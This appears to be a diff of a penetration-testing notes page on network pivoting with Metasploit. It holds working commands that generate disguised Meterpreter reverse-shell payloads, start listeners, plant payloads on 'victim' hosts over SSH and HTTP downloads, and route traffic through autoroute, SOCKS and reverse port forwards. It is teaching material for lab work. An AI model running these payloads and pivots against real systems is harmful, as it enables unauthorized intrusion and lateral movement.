@@ -16799,28 +16799,30 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h4 id="module-autoroute-in-metasploit">Module <code>Autoroute</code> in metasploit</h4>
 <p>Autoroute module allows you to set routes from a meterpreter session to a discovered subnet in the attacked machine. It allow us pivoting from one subnet to another.</p>
 <p><strong>1.</strong> Create a payload for Ubuntu Pivot Host (our victim's machine 1):</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="go">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip -f elf -o backupjob LPORT=8080</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="gp"># </span>From<span class="w"> </span>the<span class="w"> </span>kali<span class="w"> </span>attacker<span class="w"> </span>machine
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="go">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip -f elf -o backupjob LPORT=8080</span>
 </span></code></pre></div>
 <p><strong>2.</strong> Start a multi/handler, also known as a Generic Payload Handler.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="go">msfconsole -q</span>
-</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="go">use exploit/multi/handler</span>
-</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="go">set lhost 0.0.0.0</span>
-</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="go">set lport 8080</span>
-</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="go">set payload linux/x64/meterpreter/reverse_tcp</span>
-</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="go">run</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="gp"># </span>From<span class="w"> </span>the<span class="w"> </span>kali<span class="w"> </span>attacker<span class="w"> </span>machine
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="go">msfconsole -q</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="go">use exploit/multi/handler</span>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="go">set lhost 0.0.0.0</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="go">set lport 8080</span>
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="go">set payload linux/x64/meterpreter/reverse_tcp</span>
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="go">run</span>
 </span></code></pre></div>
 <p><strong>3.</strong> Copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="gp"># </span>From<span class="w"> </span>kali,<span class="w"> </span>we<span class="w"> </span>copy<span class="w"> </span>the<span class="w"> </span>file
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="go">scp backupjob $username@$ip:~/</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="gp"># </span>From<span class="w"> </span>kali,<span class="w"> </span>we<span class="w"> </span>copy<span class="w"> </span>the<span class="w"> </span>file<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>Ubuntu<span class="w"> </span>compromised<span class="w"> </span>machine
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="go">scp backupjob $username@$ipUbuntuCompromisedmachine:~/</span>
 </span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
 </span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="gp"># </span>Connect<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>victim<span class="err">&#39;</span>s<span class="w"> </span>machine
-</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="go">ssh $username@$ip</span>
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="go">ssh $username@$ipUbuntuCompromisedmachine</span>
 </span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="go">chmod +x backupjob </span>
 </span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>
 </span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="gp"># </span>And<span class="w"> </span>execute<span class="w"> </span>it
 </span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a><span class="go">./backupjob</span>
 </span></code></pre></div>
-<p><strong>4.</strong> Once the meterpreter Session is established, use Metasploit's post-exploitation routing module <code>socks_proxy</code> to configure a local proxy on our attack host.</p>
+<p><strong>4.</strong> Once the meterpreter Session is established, send the session to the background with CTRL-z and in the same terminal use Metasploit's post-exploitation routing module <code>socks_proxy</code> to configure a local proxy on our attack host.</p>
 <div class="language-shell-session highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="go">use auxiliary/server/socks_proxy</span>
 </span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="go">set SRVPORT 9050</span>
 </span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="go">set SRVHOST </span>
@@ -16828,10 +16830,10 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="go">run</span>
 </span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="gp"># </span>This<span class="w"> </span>SOCKS<span class="w"> </span>configuration<span class="w"> </span>will<span class="w"> </span>start<span class="w"> </span>a<span class="w"> </span>listener<span class="w"> </span>on<span class="w"> </span>port<span class="w"> </span><span class="m">9050</span><span class="w"> </span>and<span class="w"> </span>route<span class="w"> </span>all<span class="w"> </span>the<span class="w"> </span>traffic<span class="w"> </span>received<span class="w"> </span>via<span class="w"> </span>our<span class="w"> </span>Meterpreter<span class="w"> </span>session.
 </span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>
-</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a><span class="gp"># </span>This<span class="w"> </span>SOCKS<span class="w"> </span>configuration<span class="w"> </span>will<span class="w"> </span>start<span class="w"> </span>a<span class="w"> </span>listener<span class="w"> </span>on<span class="w"> </span>port<span class="w"> </span><span class="m">9050</span><span class="w"> </span>and<span class="w"> </span>route<span class="w"> </span>all<span class="w"> </span>the<span class="w"> </span>traffic<span class="w"> </span>received<span class="w"> </span>via<span class="w"> </span>our<span class="w"> </span>Meterpreter<span class="w"> </span>session.
+</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a><span class="gp"># </span>This<span class="w"> </span>SOCKS<span class="w"> </span>configuration<span class="w"> </span>will<span class="w"> </span>start<span class="w"> </span>a<span class="w"> </span>listener<span class="w"> </span>on<span class="w"> </span>port<span class="w"> </span><span class="m">9050</span><span class="w"> </span>and<span class="w"> </span>route<span class="w"> </span>all<span class="w"> </span>the<span class="w"> </span>traffic<span class="w"> </span>received<span class="w"> </span>via<span class="w"> </span>our<span class="w"> </span>Meterpreter<span class="w"> </span>session.<span class="w"> </span>Even<span class="w"> </span>though<span class="w"> </span>the<span class="w"> </span><span class="nb">command</span><span class="w"> </span>line<span class="w"> </span>has<span class="w"> </span>not<span class="w"> </span>returned<span class="w"> </span>anything<span class="w"> </span>you<span class="w"> </span>can<span class="w"> </span>ask<span class="w"> </span><span class="k">for</span><span class="w"> </span>the<span class="w"> </span><span class="nb">jobs</span><span class="w"> </span><span class="k">in</span><span class="w"> </span>execution<span class="w"> </span>with:
 </span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a><span class="go">jobs</span>
 </span></code></pre></div>
-<p><strong>5.</strong> Add a Line to proxychains.conf if needed.</p>
+<p><strong>5.</strong> Add a Line to proxychains.conf if needed (in your kali machine).</p>
 <div class="language-shell-session highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="go">socks4  127.0.0.1 9050</span>
 </span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="gp"># </span>Note:<span class="w"> </span>Depending<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>version<span class="w"> </span>the<span class="w"> </span>SOCKS<span class="w"> </span>server<span class="w"> </span>is<span class="w"> </span>running,<span class="w"> </span>we<span class="w"> </span>may<span class="w"> </span>occasionally<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>changes<span class="w"> </span>socks4<span class="w"> </span>to<span class="w"> </span>socks5<span class="w"> </span><span class="k">in</span><span class="w"> </span>proxychains.conf.
 </span></code></pre></div>
@@ -16839,17 +16841,22 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <div class="language-shell-session highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="go">use post/multi/manage/autoroute</span>
 </span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="go">set SESSION 1</span>
 </span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="go">set SUBNET $NewSubnet</span>
-</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="go">run</span>
-</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="gp"># </span>this<span class="w"> </span>will<span class="w"> </span><span class="nb">bind</span><span class="w"> </span>session<span class="w"> </span><span class="m">1</span><span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span><span class="nv">$NewSubnet</span><span class="w"> </span>discovered<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>victim<span class="err">&#39;</span>s<span class="w"> </span>machine<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>doing<span class="w"> </span>the<span class="w"> </span>pivoting
-</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>
-</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="gp"># </span>It<span class="w"> </span>is<span class="w"> </span>also<span class="w"> </span>possible<span class="w"> </span>to<span class="w"> </span>add<span class="w"> </span>routes<span class="w"> </span>with<span class="w"> </span>autoroute<span class="w"> </span>by<span class="w"> </span>running<span class="w"> </span>autoroute<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>initial<span class="w"> </span>Meterpreter<span class="w"> </span>session<span class="w"> </span><span class="o">(</span>session<span class="w"> </span><span class="m">1</span><span class="o">)</span>:
-</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a><span class="go">run autoroute -s $NewDiscoveredIp/23</span>
-</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a>
-</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a><span class="gp"># </span>List<span class="w"> </span>the<span class="w"> </span>active<span class="w"> </span>routes:
-</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a><span class="go">run autoroute -p</span>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="gp"># </span>Example:<span class="w"> </span><span class="nb">set</span><span class="w"> </span>SUBNET<span class="w"> </span><span class="m">172</span>.16.5.0
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="go">run</span>
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="gp"># </span>this<span class="w"> </span>will<span class="w"> </span><span class="nb">bind</span><span class="w"> </span>session<span class="w"> </span><span class="m">1</span><span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span><span class="nv">$NewSubnet</span><span class="w"> </span>discovered<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>victim<span class="err">&#39;</span>s<span class="w"> </span>machine<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>doing<span class="w"> </span>the<span class="w"> </span>pivoting
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>
+</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a><span class="gp"># </span>It<span class="w"> </span>is<span class="w"> </span>also<span class="w"> </span>possible<span class="w"> </span>to<span class="w"> </span>add<span class="w"> </span>routes<span class="w"> </span>with<span class="w"> </span>autoroute<span class="w"> </span>by<span class="w"> </span>running<span class="w"> </span>autoroute<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>initial<span class="w"> </span>Meterpreter<span class="w"> </span>session<span class="w"> </span><span class="o">(</span>session<span class="w"> </span><span class="m">1</span><span class="o">)</span>:
+</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a><span class="go">sessions -i 1</span>
+</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a><span class="go">run autoroute -s $NewDiscoveredIp/16</span>
+</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a>
+</span><span id="__span-36-12"><a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a><span class="gp"># </span>List<span class="w"> </span>the<span class="w"> </span>active<span class="w"> </span>routes:
+</span><span id="__span-36-13"><a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a><span class="go">run autoroute -p</span>
 </span></code></pre></div>
-<p><strong>7.</strong>  Finally, use proxychains to route our Nmap traffic via our Meterpreter session.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="go">proxychains nmap $NewDiscoveredIp -p3389 -sT -v -Pn</span>
+<p><strong>7.</strong>  Make sure that you will get back the communications with a reverse proxy:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>ssh -i id_rsa $username@$ipUbuntuCompromisedmachine -R $ip:8080:0.0.0.0:8000
+</span></code></pre></div>
+<p><strong>8.</strong> Finally, use proxychains to route our Nmap traffic via our Meterpreter session.</p>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="go">proxychains nmap $NewDiscoveredIp -p3389 -sT -v -Pn</span>
 </span></code></pre></div>
 <h3 id="reverse-port-forwarding">Reverse Port Forwarding</h3>
 <p>For better understanding, we will have the following machines:</p>
@@ -16862,83 +16869,83 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h4 id="ssh-reverse-port-forwarding">SSH Reverse Port Forwarding</h4>
 <p><strong>Goal</strong>: From the kali we will make a RDP connection with Meta_2, the windows machine. </p>
 <p>For that we will use the Victim's machine 1 as a reverse port forwarding. </p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="gp"># </span>Syntax
-</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="go">ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN</span>
-</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>
-</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="gp"># </span>Translated<span class="w"> </span>to<span class="w"> </span>our<span class="w"> </span><span class="k">case</span>:
-</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="go">ssh -R 192.182.147.2:8080:0.0.0.0:8000 ubuntu@192.64.166.3 -vN</span>
-</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="gp"># </span>We<span class="w"> </span>are<span class="w"> </span>using<span class="w"> </span>port<span class="w"> </span><span class="m">8080</span><span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>Ubuntu<span class="w"> </span>server<span class="w"> </span>to<span class="w"> </span>forward<span class="w"> </span>all<span class="w"> </span>of<span class="w"> </span>our<span class="w"> </span>reverse<span class="w"> </span>packets<span class="w"> </span>to<span class="w"> </span>our<span class="w"> </span>attack<span class="w"> </span>hosts<span class="err">&#39;</span><span class="w"> </span><span class="m">8000</span><span class="w"> </span>port
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="gp"># </span>Syntax
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="go">ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="gp"># </span>Translated<span class="w"> </span>to<span class="w"> </span>our<span class="w"> </span><span class="k">case</span>:
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="go">ssh -R 192.182.147.2:8080:0.0.0.0:8000 ubuntu@192.64.166.3 -vN</span>
+</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="gp"># </span>We<span class="w"> </span>are<span class="w"> </span>using<span class="w"> </span>port<span class="w"> </span><span class="m">8080</span><span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>Ubuntu<span class="w"> </span>server<span class="w"> </span>to<span class="w"> </span>forward<span class="w"> </span>all<span class="w"> </span>of<span class="w"> </span>our<span class="w"> </span>reverse<span class="w"> </span>packets<span class="w"> </span>to<span class="w"> </span>our<span class="w"> </span>attack<span class="w"> </span>hosts<span class="err">&#39;</span><span class="w"> </span><span class="m">8000</span><span class="w"> </span>port
 </span></code></pre></div>
 <h5 id="obtain-a-reverse-shell">Obtain a reverse shell</h5>
 <p>Now we need to create a payload that is going to be triggered in the Victim's machine 2 (the windows one).  First we create it in our kali:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="go">msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.182.147.2 -f exe -o backupscript.exe LPORT=8080</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="go">msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.182.147.2 -f exe -o backupscript.exe LPORT=8080</span>
 </span></code></pre></div>
 <p>Now we move this malicious file to the victim's machine 2:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a># First we copy it to the Ubuntu machine from our Kali
-</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a> scp backupscript.exe ubuntu@192.64.166.3:~/
-</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>
-</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a># Then we connect to the Ubuntu machine
-</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>ssh ubuntu@192.64.166.3
-</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a># And make the file executable
-</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a>chmod +x backupjob
-</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a># And there we start a http server to serve the copied file to the windows machine:
-</span><span id="__span-40-9"><a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a>python3 -m http.server 8123
-</span><span id="__span-40-10"><a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a>
-</span><span id="__span-40-11"><a id="__codelineno-40-11" name="__codelineno-40-11" href="#__codelineno-40-11"></a># We have access to the windows machine, so we download the malicious file via web browser or even this command:
-</span><span id="__span-40-12"><a id="__codelineno-40-12" name="__codelineno-40-12" href="#__codelineno-40-12"></a>Invoke-WebRequest -Uri &quot;http://192.64.166.3:8123/backupscript.exe&quot; -OutFile &quot;C:\backupscript.exe&quot;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a># First we copy it to the Ubuntu machine from our Kali
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a> scp backupscript.exe ubuntu@192.64.166.3:~/
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a># Then we connect to the Ubuntu machine
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>ssh ubuntu@192.64.166.3
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a># And make the file executable
+</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>chmod +x backupjob
+</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a># And there we start a http server to serve the copied file to the windows machine:
+</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a>python3 -m http.server 8123
+</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a>
+</span><span id="__span-41-11"><a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a># We have access to the windows machine, so we download the malicious file via web browser or even this command:
+</span><span id="__span-41-12"><a id="__codelineno-41-12" name="__codelineno-41-12" href="#__codelineno-41-12"></a>Invoke-WebRequest -Uri &quot;http://192.64.166.3:8123/backupscript.exe&quot; -OutFile &quot;C:\backupscript.exe&quot;
 </span></code></pre></div>
 <p>Now, we start a listener in our kali:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>msfconsole -q
-</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>use exploit/multi/handler
-</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>set payload windows/x64/meterpreter/reverse_https
-</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>set lhost 0.0.0.0
-</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>set lport 8000
-</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>run
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>msfconsole -q
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>use exploit/multi/handler
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>set payload windows/x64/meterpreter/reverse_https
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>set lhost 0.0.0.0
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>set lport 8000
+</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>run
 </span></code></pre></div>
 <p>Now we  execute the payload from the Windows target.</p>
 <p>We will receive the reverse shell.</p>
 <h4 id="module-portfwd-in-metasploit_1">Module <code>portfwd</code> in metasploit</h4>
 <p>Reverse  port forwarding can also be accomplished using Meterpreter's <code>portfwd</code> module,  where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host.</p>
 <p>We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port <code>1234</code> to our listener on port <code>8081</code>.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="go">meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 192.64.166.3</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="go">meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 192.64.166.3</span>
 </span></code></pre></div>
 <p><strong>1.</strong> Configuring &amp; Starting multi/handler</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="go">meterpreter &gt; set payload windows/x64/meterpreter/reverse_tcp</span>
-</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="go">set LPORT 8081 </span>
-</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="go">set LHOST 0.0.0.0 </span>
-</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="go">run</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="go">meterpreter &gt; set payload windows/x64/meterpreter/reverse_tcp</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="go">set LPORT 8081 </span>
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="go">set LHOST 0.0.0.0 </span>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="go">run</span>
 </span></code></pre></div>
 <p>We can now create a reverse shell payload that will send a connection back to our Ubuntu server on <code>192.182.147.2</code>:<code>1234</code> when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to <code>attack host's ip</code>:<code>8081</code> that we configured.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="go">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.182.147.2 -f exe -o backupscript.exe LPORT=1234</span>
